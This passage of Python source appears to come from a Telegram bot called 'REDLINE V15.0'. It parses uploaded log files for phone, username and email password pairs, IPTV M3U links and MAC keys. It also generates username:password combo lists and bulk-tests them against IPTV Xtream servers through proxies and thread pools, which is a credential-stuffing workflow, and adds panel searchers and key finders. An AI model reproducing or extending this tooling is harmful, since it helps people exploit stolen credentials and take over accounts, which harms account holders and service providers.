            context.user_data.clear()
            return

    # PHASE 3: MAC Host Single (host then mac)
    if mode == 'mac_host_single':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Checking MAC host...</b>")
            ok = False
            detail = ''
            if HAS_REQUESTS:
                try:
                    # Quick handshake check
                    base = host
                    url = f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
                    r = Net.get(url, timeout=8, allow_redirects=False, proxies=get_proxies())
                    ok = (r.status_code == 200)
                    detail = (r.text or '')[:200]
                except Exception as e:
                    detail = f"Error: {str(e)}"
            await status_msg.edit_text(
                ("✅ <b>Reachable</b>" if ok else "❌ <b>Unreachable</b>") + f"\nHost: <code>{host}</code>\nMAC: <code>{mac}</code>",
                parse_mode='HTML'
            )
            context.user_data.clear()
            return

    # PHASE 3: Combo Generator
    if mode == 'combo_generator':
        spec = (update.message.text or '').strip()
        parts = [p.strip() for p in spec.split(',')]
        if len(parts) != 4:
            await update.message.reply_html("❌ <b>Invalid format</b><br>Use: <code>prefix,password,start,end</code>")
            return
        prefix, password, s, e = parts
        try:
            start = int(s); end = int(e)
            if end < start or end - start > 2000:
                await update.message.reply_html("❌ <b>Range too large</b> (max 2000)")
                return
        except Exception:
            await update.message.reply_html("❌ <b>Invalid numbers</b>")
            return
        combos = [f"{prefix}{i}:{password}" for i in range(start, end+1)]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"COMBO_GENERATOR_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(combos))
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Combos Generated</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Total: {len(combos):,}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    # === Phase 3: U:P Xtream Single ===
    if data == "up_xtream_single":
        context.user_data.clear()
        context.user_data['mode'] = 'up_xtream_single'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>⚡ U:P Xtream Check (Single)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: M3U Manual ===
    if data == "m3u_manual":
        context.user_data.clear()
        context.user_data['mode'] = 'm3u_manual'
        await query.edit_message_text(
            "<b>🔍 M3U Manual Check</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send a single M3U URL to test",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: MAC → M3U (interactive) ===
    if data == "mac_to_m3u":
        context.user_data.clear()
        context.user_data['mode'] = 'mac_to_m3u'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>↩️ MAC → M3U</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: MAC Host Single ===
    if data == "mac_host_single":
        context.user_data.clear()
        context.user_data['mode'] = 'mac_host_single'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>📱 MAC Host Check (Single)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 3: Combo Generator ===
    if data == "combo_generator":
        context.user_data.clear()
        context.user_data['mode'] = 'combo_generator'
        await query.edit_message_text(
            "<b>🧪 Combo Generator</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send input in format: <code>prefix,password,start,end</code>\n"
            "Example: <code>user,pass,1,100</code> → user1:pass ... user100:pass",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # PHASE 2: WHOIS (text input)
    if mode == 'whois_lookup':
        target = update.message.text.strip()
        status_msg = await update.message.reply_html("⏳ <b>Running WHOIS...</b>")
        tgt, report = WHOISLookup.whois_report(target)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"WHOIS_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(report + "\n")
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>WHOIS Complete</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🎯 Target: <code>{tgt}</code>"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        await status_msg.delete()
        os.remove(result_path)
        context.user_data.clear()
        return

    # PHASE 2: KEYWORD SEARCHER (keywords after file)
    if mode == 'keyword_searcher' and 'search_text' in context.user_data:
        kw_line = update.message.text or ''
        keywords = [k.strip() for k in kw_line.split(',') if k.strip()]
        if not keywords:
            await update.message.reply_html("❌ <b>No keywords provided</b>")
            return
        results = KeywordSearcher.search(context.user_data['search_text'], keywords)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"KEYWORD_SEARCH_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# Keyword Search Results\n")
            f.write(f"# Keywords: {', '.join(keywords)}\n\n")
            if not results:
                f.write("No matches found\n")
            else:
                for kw, lines in results.items():
                    f.write(f"# === {kw} ({len(lines)}) ===\n")
                    for ln in lines:
                        f.write(ln + "\n")
                    f.write("\n")
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Keyword Search Complete</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"🔎 Keywords: {len(keywords)}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    
    # Mode selection for extractions
    if data.startswith("mode_"):
        mode = data.replace("mode_", "")
        context.user_data['mode'] = mode
        context.user_data['action'] = 'extract'
        
        mode_info = {
            'np': ('📱 N:P (Phone:Password)', 'Extract phone numbers with passwords'),
            'up': ('👤 U:P (Username:Password)', 'Extract usernames with passwords (no emails)'),
            'mp': ('📧 M:P (Email:Password)', 'Extract emails with passwords'),
            'm3u': ('🔗 M3U Links', 'Extract M3U and M3U8 links (Xtream API)'),
            'mac': ('🔑 MAC:KEY', 'Extract MAC addresses with keys'),
            'all': ('⭐ Extract ALL', 'Extract all combo types at once')
        }
        
        title, description = mode_info.get(mode, ('Unknown', 'Unknown'))
        
        text = (
            f"<b>{title}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 {description}\n\n"
            "📤 <b>Send your file now:</b>\n"
            "• Supported: .txt, .log files\n"
            "• Multiple files allowed\n"
            "• Instant processing!\n\n"
            "⏳ Waiting for file..."
        )
        
        await query.edit_message_text(
            text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
    
    
    # M3U Checker
    if data == "check_m3u":
        context.user_data['mode'] = 'check_m3u'
        context.user_data['action'] = 'check'
        text = (
            "✅ <b>M3U Link Checker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔍 Check M3U links for validity (Live validation)\n\n"
            "📤 <b>Send a file containing:</b>\n"
            "• M3U links (one per line)\n"
            "• Xtream API URLs\n"
            "• M3U8 links\n\n"
            "⚡ <b>Features:</b>\n"
            "• Multi-threaded checking (super fast!)\n"
            "• Supports up to 1000 links\n"
            "• Detailed results (ALIVE/DEAD/ERROR)\n\n"
            "⏳ Send your M3U file..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # M3U to Combo
    elif data == "m3u_to_combo":
        context.user_data['mode'] = 'm3u_to_combo'
        context.user_data['action'] = 'convert'
        text = (
            "🔄 <b>M3U → Combo Converter</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔀 Convert M3U links to username:password format\n\n"
            "📤 <b>Send M3U file containing:</b>\n"
            "• Xtream API URLs\n"
            "• get.php links with username/password\n\n"
            "✨ <b>Bot will extract:</b>\n"
            "• username:password from each link\n"
            "• Auto-cleanup and deduplicate\n"
            "• Sorted results\n\n"
            "⏳ Send your M3U file..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # Combo to M3U
    elif data == "combo_to_m3u":
        context.user_data['mode'] = 'combo_to_m3u'
        context.user_data['action'] = 'convert'
        text = (
            "🔄 <b>Combo → M3U Converter</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔀 Convert username:password to M3U format\n\n"
            "📤 <b>Step 1: Send combo file</b>\n"
            "• username:password format\n"
            "• One combo per line\n\n"
            "📝 <b>Step 2: Send Base URL</b> (next message)\n"
            "• Example: http://example.com:8080\n"
            "• Bot adds /get.php?username=...&password=...\n\n"
            "⏳ Send your combo file first..."
        )
        await query.edit_message_text(text, parse_mode='HTML', reply_markup=get_back_button())
    
    # Back to menu
    elif data == "back":
        welcome_text = (
            "🔥 <b>REDLINE V15.0 - Enhanced Bot</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Select an option:"
        )
        await query.edit_message_text(
            welcome_text,
            parse_mode='HTML',
            reply_markup=get_main_menu()
        )
    
    # Help
    elif data == "help":
        help_text = (
            "📖 <b>User Guide</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "<b>How to use:</b>\n\n"
            "1️⃣ <b>Select extraction type</b>\n"
            "   • N:P for phone numbers\n"
            "   • U:P for usernames\n"
            "   • M:P for emails\n"
            "   • M3U for links\n"
            "   • MAC:KEY for MAC addresses\n"
            "   • ALL to extract everything\n\n"
            "2️⃣ <b>Send your log file</b>\n"
            "   • .txt or .log format\n"
            "   • Multiple files allowed\n\n"
            "3️⃣ <b>Receive results</b>\n"
            "   • Clean text file ready to use\n"
            "   • With hit count\n\n"
            "⚡ Processing is instant!\n"
            "🔒 Privacy: Files deleted after processing"
        )
        await query.edit_message_text(
            help_text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
    
    # Stats
    elif data == "stats":
        stats_text = (
            "📊 <b>Bot Statistics</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 User: {query.from_user.mention_html()}\n"
            f"🆔 ID: <code>{query.from_user.id}</code>\n\n"
            "🔥 <b>REDLINE V15.0 Enhanced</b>\n"
            "⚡ Version: 2.0\n"
            "🤖 Status: Online\n"
            "🛠️ Tier 1 Features: Active\n\n"
            "✨ Ready to use!"
        )
        await query.edit_message_text(
            stats_text,
            parse_mode='HTML',
            reply_markup=get_back_button()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads and process extraction - ALL ENGLISH"""
    mode = context.user_data.get('mode')
    action = context.user_data.get('action', 'extract')
    
    if not mode:
        await update.message.reply_text(
            "⚠️ Please select an option first\n"
            "Use /redline to show menu"
        )
        return
    
    # Check file size
    file_size = update.message.document.file_size
    if file_size > MAX_FILE_SIZE:
        await update.message.reply_text(
            f"❌ <b>File too large!</b>\n\n"
            f"Maximum size: {MAX_FILE_SIZE // (1024*1024)}MB\n"
            f"Your file: {file_size // (1024*1024)}MB\n\n"
            f"Please split the file and try again.",
            parse_mode='HTML'
        )
        return
    
    # Show processing message
    status_msg = await update.message.reply_text(
        "⏳ <b>Processing...</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📥 Downloading file...",
        parse_mode='HTML'
    )
    
    try:
        # Download file
        file = await update.message.document.get_file()
        file_path = os.path.join(TEMP_DIR, f"{update.effective_user.id}_{file.file_id}.txt")
        await file.download_to_drive(file_path)
        
        # Update status
        await status_msg.edit_text(
            "⏳ <b>Processing...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📄 Reading file...",
            parse_mode='HTML'
        )
        
        # Read file content
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            text = f.read()
        
        # === HANDLE U:P XTREAM AUTO (batch) ===
        if mode == 'up_xtream_auto' and context.user_data.get('step') == 'await_file':
            await status_msg.edit_text(
                "⏳ <b>Probing Xtream Accounts...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔍 player_api.php",
                parse_mode='HTML'
            )
            host = context.user_data.get('host') or ''
            combos_raw = [ln.strip() for ln in text.split('\n') if ':' in ln]
            combos = []
            for ln in combos_raw:
                u, p = ln.split(':', 1)
                if u and p:
                    combos.append((u.strip(), p.strip()))
            if not combos:
                await status_msg.edit_text("❌ <b>No combos found!</b>", parse_mode='HTML')
                os.remove(file_path)
                context.user_data.clear()
                return
            limit = int(GLOBAL_SETTINGS.get('combo_limit', 500))
            combos = combos[:limit]
            workers = int(GLOBAL_SETTINGS.get('workers', 12))
            include_ch = bool(GLOBAL_SETTINGS.get('include_channels_auto'))
            done = 0
            found = 0
            total = len(combos)
            blocks: List[str] = []
            # show typing while processing
            try:
                await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
            except Exception:
                pass
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(UpProbe.probe_up, host, u, p, 8, get_proxies()): (u, p) for (u, p) in combos}
                for fu in as_completed(futs):
                    ok, info, err = fu.result()
                    done += 1
                    if ok:
                        if include_ch:
                            try:
                                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=3, proxies=get_proxies(), max_kb=64)
                                if ch:
                                    info['channels'] = ch
                            except Exception:
                                pass
                        blocks.append(M3UProbe.format_auto_block(info))
                        found += 1
                    if done % 25 == 0 or done == total:
                        try:
                            await status_msg.edit_text(
                                f"⏳ <b>Probing Xtream Accounts...</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"Processed: {done}/{total} • Valid: {found}",
                                parse_mode='HTML'
                            )
                        except Exception:
                            pass
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"UP_XTREAM_INFO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                if blocks:
                    f.write("\n".join(blocks) + "\n")
                else:
                    f.write("# No valid accounts\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>U:P Xtream Auto Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Valid: {len(blocks)} / {len(combos)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE M3U LINK CHECKER (AUTO, REDLINE info) ===
        if mode == 'check_m3u':
            await status_msg.edit_text(
                "⏳ <b>Probing M3U Accounts...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔍 player_api.php",
                parse_mode='HTML'
            )
            links = [line.strip() for line in text.split('\n') if line.strip().startswith(('http://','https://'))]
            if not links:
                await status_msg.edit_text("❌ <b>No M3U links found!</b>", parse_mode='HTML')
                os.remove(file_path)
                context.user_data.clear()
                return
            limit = int(GLOBAL_SETTINGS.get('m3u_limit', 1000))
            links = links[:limit]
            workers = int(GLOBAL_SETTINGS.get('workers', 12))
            include_ch = bool(GLOBAL_SETTINGS.get('include_channels_auto'))
            done = 0
            found = 0
            total = len(links)
            blocks: List[str] = []
            # show typing while processing
            try:
                await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
            except Exception:
                pass
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = {ex.submit(M3UProbe.probe, u, 8, get_proxies()): u for u in links}
                for fu in as_completed(futs):
                    ok, info, err = fu.result()
                    done += 1
                    if ok:
                        if include_ch:
                            try:
                                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=3, proxies=get_proxies(), max_kb=64)
                                if ch:
                                    info['channels'] = ch
                            except Exception:
                                pass
                        blocks.append(M3UProbe.format_auto_block(info))
                        found += 1
                    if done % 50 == 0 or done == total:
                        try:
                            await status_msg.edit_text(
                                f"⏳ <b>Probing M3U Accounts...</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"Processed: {done}/{total} • Valid: {found}",
                                parse_mode='HTML'
                            )
                        except Exception:
                            pass
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_INFO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                if blocks:
                    f.write("\n".join(blocks) + "\n")
                else:
                    f.write("# No valid accounts\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U Auto Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Valid: {len(blocks)} / {len(links)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return

        # === PHASE 2: KEYWORD SEARCHER (file first) ===
        elif mode == 'keyword_searcher':
            # store file content and ask for keywords
            context.user_data['search_text'] = text
            await status_msg.edit_text(
                "✅ <b>File received!</b>\n\n"
                "📝 Now send <b>keywords</b> (comma separated)\n\n"
                "Example: <code>login, password, xtream, player_api</code>",
                parse_mode='HTML'
            )
            os.remove(file_path)
            return

        # === PHASE 2: STREAMCREED FINDER ===
        elif mode == 'streamcreed_finder':
            keys = StreamCreedFinder.find(text)
            if not keys:
                await status_msg.edit_text(
                    "❌ <b>No keys found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"STREAMCREED_KEYS_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# StreamCreed Keys\n# Found: {len(keys)}\n\n")
                for k in sorted(keys):
                    f.write(k + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Keys Found!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"🔑 Total: {len(keys):,}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE M3U TO COMBO CONVERTER ===
        elif mode == 'm3u_to_combo':
            await status_msg.edit_text(
                "⏳ <b>Converting M3U→Combo...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔄 Extracting credentials...",
                parse_mode='HTML'
            )
            
            results = M3UConverter.m3u_to_combo(text)
            
            if not results:
                await status_msg.edit_text(
                    "❌ <b>No credentials found!</b>\n\n"
                    "Make sure M3U links contain username/password",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            
            # Create result file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_TO_COMBO_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# M3U to Combo Conversion\n")
                f.write(f"# Converted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Combos: {len(results)}\n")
                f.write("#" + "="*50 + "\n\n")
                f.write('\n'.join(sorted(results)))
            
            # Send result
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U→Combo Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Extracted: {len(results):,} combos\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # === HANDLE COMBO TO M3U CONVERTER ===
        elif mode == 'combo_to_m3u':
            # Check if we have combo data stored
            if 'combo_data' not in context.user_data:
                # First file upload - store combo data
                context.user_data['combo_data'] = text
                os.remove(file_path)
                
                await status_msg.edit_text(
                    "✅ <b>Combo file received!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "📝 Now send the <b>Base URL</b>\n\n"
                    "<b>Example:</b>\n"
                    "<code>http://example.com:8080</code>\n\n"
                    "⚡ Bot will create M3U links like:\n"
                    "<code>http://example.com:8080/get.php?username=XXX&password=YYY&type=m3u_plus</code>",
                    parse_mode='HTML'
                )
                return
            else:
                # This shouldn't happen but handle it
                await status_msg.edit_text(
                    "⚠️ <b>Please send Base URL as text message</b>\n\n"
                    "Not as a file!",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                return
        
        # === HANDLE M3U TO MAC CONVERTER (file input) ===
        elif mode == 'm3u_to_mac':
            await status_msg.edit_text(
                "⏳ <b>Converting M3U→MAC...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔄 Extracting stream IDs...",
                parse_mode='HTML'
            )
            mac_urls = MACConverter.m3u_to_mac(text)
            if not mac_urls:
                await status_msg.edit_text(
                    "❌ <b>No valid M3U links found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"M3U_TO_MAC_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                for url in sorted(mac_urls):
                    f.write(f"{url}\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>M3U→MAC Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 URLs: {len(mac_urls):,}\n"
                        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return

        # === HANDLE PANEL SEARCHER ===
        elif mode == 'panel_searcher':
            await status_msg.edit_text(
                "⏳ <b>Searching panels...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔎 Detecting IPTV/XUI endpoints...",
                parse_mode='HTML'
            )
            panels = PanelSearcher.find(text)
            if not panels:
                await status_msg.edit_text(
                    "❌ <b>No panel URLs found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"PANEL_SEARCH_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Logs Panel Searcher\n")
                f.write(f"# Found: {len(panels)}\n")
                f.write("#" + "="*50 + "\n\n")
                for u in sorted(panels):
                    f.write(u + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Panel Search Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Found: {len(panels):,} panels"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return

        # === HANDLE CHECK LIVE PANELS ===
        elif mode == 'check_panels':
            await status_msg.edit_text(
                "⏳ <b>Checking panels...</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔎 Categorizing panels...",
                parse_mode='HTML'
            )
            urls = [line.strip() for line in text.split('\n') if line.strip().startswith(('http://','https://'))]
            if not urls:
                await status_msg.edit_text(
                    "❌ <b>No URLs found!</b>",
                    parse_mode='HTML'
                )
                os.remove(file_path)
                context.user_data.clear()
                return
            urls = urls[:1000]
            categories = {k: [] for k in [
                'VALID','VPN_NEEDED','WAF','CAPTCHA','DNS_ERROR','TIMEOUT','INVALID','ERROR']}
            with ThreadPoolExecutor(max_workers=12) as ex:
                futs = {ex.submit(PanelChecker.categorize, u, 3, PROXY_CONFIG): u for u in urls}
                for fu in as_completed(futs):
                    cat, det = fu.result()
                    u = futs[fu]
                    categories.setdefault(cat, []).append((u, det))
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"PANELS_CHECK_{timestamp}.txt"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write(f"# Check Live Panels (Categorized)\n")
                total_valid = len(categories.get('VALID', []))
                f.write(f"# Checked: {len(urls)} | VALID: {total_valid}\n")
                f.write("#" + "="*50 + "\n\n")
                order = ['VALID','VPN_NEEDED','WAF','CAPTCHA','DNS_ERROR','TIMEOUT','INVALID','ERROR']
                for cat in order:
                    items = categories.get(cat, [])
                    if not items:
                        continue
                    f.write(f"# ===== {cat} ({len(items)}) =====\n")
                    for u, det in items:
                        suffix = f"  # {det}" if det else ""
                        f.write(f"{u}{suffix}\n")
                    f.write("\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>Panels Check Complete!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 VALID: {len(categories.get('VALID', []))} / {len(urls)}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(file_path)
            os.remove(result_path)
            context.user_data.clear()
            return
        
        # Update status for regular extractions
        await status_msg.edit_text(
            "⏳ <b>Processing...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🔍 Extracting data...",
            parse_mode='HTML'
        )
        
        # Extract based on mode
        extractor = RedlineExtractor()
        results = set()
        result_type = mode.upper()
        
        if mode == 'np':
            results = extractor.extract_np(text)
        elif mode == 'up':
            results = extractor.extract_up(text)
        elif mode == 'mp':
            results = extractor.extract_mp(text)
        elif mode == 'm3u':
            results = extractor.extract_m3u(text)
        elif mode == 'mac':
            results = extractor.extract_mac_key(text)
        elif mode == 'all':
            all_results = extractor.extract_all(text)
            # Combine all results
            combined = []
            for key, items in all_results.items():
                if items:
                    combined.append(f"\n# ===== {key.upper()} ({len(items)} found) =====")
                    combined.extend(sorted(items))
            results = set(combined)
            result_type = "ALL_COMBOS"
        
        # Check if results found
        if not results:
            await status_msg.edit_text(
                "❌ <b>No results found!</b>\n\n"
                "Make sure the file contains the required data",
                parse_mode='HTML'
            )
            # Clean up
            os.remove(file_path)
            context.user_data.clear()
            return
        
        # Create result file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"{result_type}_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        
        # Write results
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# REDLINE V15.0 - {result_type}\n")
            f.write(f"# Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Found: {len(results)}\n")
            f.write("#" + "="*50 + "\n\n")
            f.write('\n'.join(sorted(results)))
        
        # Send result file
        with open(result_path, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Extraction Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Type: {result_type}\n"
                    f"🎯 Results: {len(results):,}\n"
                    f"📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
                    f"✨ Ready to use!"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        
        # Delete status message
        await status_msg.delete()
        
        # Clean up files
        os.remove(file_path)
        os.remove(result_path)
        
        # Clear user mode
        context.user_data.clear()
        
        # Post to channel (optional): use first allowed channel if set
        try:
            target_channel = next(iter(ALLOWED_CHANNEL_IDS)) if ALLOWED_CHANNEL_IDS else None
